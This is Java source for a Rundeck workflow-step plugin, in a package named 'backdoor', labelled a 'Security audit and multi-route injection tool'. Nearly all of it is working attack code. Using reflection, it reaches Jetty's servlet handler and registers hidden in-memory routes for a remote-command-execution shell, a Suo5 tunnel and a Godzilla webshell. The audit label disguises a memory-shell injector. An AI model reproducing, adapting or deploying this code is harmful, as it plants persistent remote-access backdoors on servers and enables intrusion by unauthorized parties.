package com.rundeck.plugins.backdoor;

import com.dtolabs.rundeck.core.plugins.Plugin;
import com.dtolabs.rundeck.plugins.ServiceNameConstants;
import com.dtolabs.rundeck.plugins.descriptions.PluginDescription;
import com.dtolabs.rundeck.plugins.descriptions.PluginProperty;
import com.dtolabs.rundeck.plugins.descriptions.SelectValues;
import com.dtolabs.rundeck.plugins.step.PluginStepContext;
import com.dtolabs.rundeck.plugins.step.StepPlugin;

import java.lang.reflect.*;
import java.util.Map;


@Plugin(name = "RundeckTestPlugin", service = ServiceNameConstants.WorkflowStep)
@PluginDescription(title = "Rundeck Test Plugin", description = "Security audit and multi-route injection tool")
public class SecurityAuditPlugin implements StepPlugin {

    private static boolean injected = false;

    /**
     * 路由选择配置
     */
    @PluginProperty(
        title = "Route Selection",
        required = false,
        defaultValue = "v4,v5,v6"
    )
    private String routes;

    @Override
    public void executeStep(PluginStepContext context, Map<String, Object> configuration) {
    

        if (!injected) {
            try {
                // 获取路由配置
                String routeConfig = (String) configuration.getOrDefault("routes", "v4,v5,v6");
                context.getLogger().log(2, "Route Configuration: " + routeConfig);

                // 执行注入
                inject(context, routeConfig);
                injected = true;

                context.getLogger().log(2, "\n========================================");
                context.getLogger().log(2, "注入成功！");
                context.getLogger().log(2, "========================================");

            } catch (Exception e) {
                context.getLogger().log(0, "✗ Injection failed: " + e.getMessage());
                e.printStackTrace();
            }
        } else {
            context.getLogger().log(2, "Already injected, skipping...");
        }

        context.getLogger().log(2, "Rundeck Test completed");
    }

    /**
     * 主注入逻辑
     */
    private static void inject(PluginStepContext context, String routeConfig) throws Exception {
        context.getLogger().log(2, "\n[Step 1] Finding ClassLoader...");

        // 1. 获取 ServletContext
        Class<?> holders = Class.forName("grails.util.Holders");
        Object app = holders.getMethod("getGrailsApplication").invoke(null);
        Object mainCtx = app.getClass().getMethod("getMainContext").invoke(app);
        Object servletContext = mainCtx.getClass().getMethod("getServletContext").invoke(mainCtx);

        ClassLoader cl = servletContext.getClass().getClassLoader();
        context.getLogger().log(2, "✓ ClassLoader: " + cl.getClass().getName());

        // 2. 获取 ServletHandler
        context.getLogger().log(2, "\n[Step 2] Getting ServletHandler...");
        Object contextHandler;
        try {
            contextHandler = servletContext.getClass().getMethod("getServletContextHandler").invoke(servletContext);
            context.getLogger().log(2, "  Method: getServletContextHandler()");
        } catch (Exception e) {
            try {
                contextHandler = servletContext.getClass().getMethod("getContextHandler").invoke(servletContext);
                context.getLogger().log(2, "  Method: getContextHandler()");
            } catch (Exception e2) {
                Field f = servletContext.getClass().getDeclaredField("this$0");
                f.setAccessible(true);
                contextHandler = f.get(servletContext);
                context.getLogger().log(2, "  Method: this$0 field");
            }
        }

        Object servletHandler = contextHandler.getClass().getMethod("getServletHandler").invoke(contextHandler);
        context.getLogger().log(2, "✓ ServletHandler: " + servletHandler.getClass().getName());

        // 3. 加载必要的类
        Class<?> servletClass = cl.loadClass("javax.servlet.Servlet");
        Class<?> holderClass = cl.loadClass("org.eclipse.jetty.servlet.ServletHolder");

        // 4. 根据配置注入路由
        boolean enableV4 = routeConfig.toLowerCase().contains("v4");
        boolean enableV5 = routeConfig.toLowerCase().contains("v5");
        boolean enableV6 = routeConfig.toLowerCase().contains("v6");

        context.getLogger().log(2, "\n[Step 3] Registering routes...");
        context.getLogger().log(2, " RCE Servlet: " + (enableV4 ? "ENABLED" : "disabled"));
        context.getLogger().log(2, " Suo5 Tunnel: " + (enableV5 ? "ENABLED" : "disabled"));
        context.getLogger().log(2, " Godzilla: " + (enableV6 ? "ENABLED" : "disabled"));
        context.getLogger().log(2, "");

        int registeredCount = 0;

        // 注册 V4: RCE Shell
        if (enableV4) {
            registerRoute(servletHandler, holderClass, servletClass, cl,
                "RCEServlet", "/static/exec", new ServletHandler(), context);
            registeredCount++;
        }

        // 注册 V5: Suo5 Tunnel
        if (enableV5) {
            registerRoute(servletHandler, holderClass, servletClass, cl,
                "Suo5Servlet", "/static/suo5", new Suo5Handler(), context);
            registeredCount++;
        }

        // 注册 V6: Godzilla Webshell
        if (enableV6) {
            registerRoute(servletHandler, holderClass, servletClass, cl,
                "GodzillaServlet", "/static/godzilla", new WebshellHandler(), context);
            registeredCount++;
        }

        context.getLogger().log(2, "\n[Step 4] Summary");
        context.getLogger().log(2, "  Total registered: " + registeredCount + " route(s)");
    }

   
    private static void registerRoute(
        Object servletHandler,
        Class<?> holderClass,
        Class<?> servletClass,
        ClassLoader cl,
        String name,
        String path,
        InvocationHandler handler,
        PluginStepContext context
    ) throws Exception {
        try {
            // 创建动态代理 Servlet
            Object servlet = Proxy.newProxyInstance(cl, new Class[]{servletClass}, handler);

            // 创建 ServletHolder
            Constructor<?> ctor = holderClass.getConstructor(String.class, servletClass);
            Object holder = ctor.newInstance(name, servlet);

            // 使用 addServletWithMapping 一步注册
            servletHandler.getClass()
                .getMethod("addServletWithMapping", holderClass, String.class)
                .invoke(servletHandler, holder, path);

            context.getLogger().log(2, "  ✓ " + name + " registered at: " + path);

        } catch (Exception e) {
            context.getLogger().log(0, "  ✗ Failed to register " + name + ": " + e.getMessage());
            throw e;
        }
    }
}
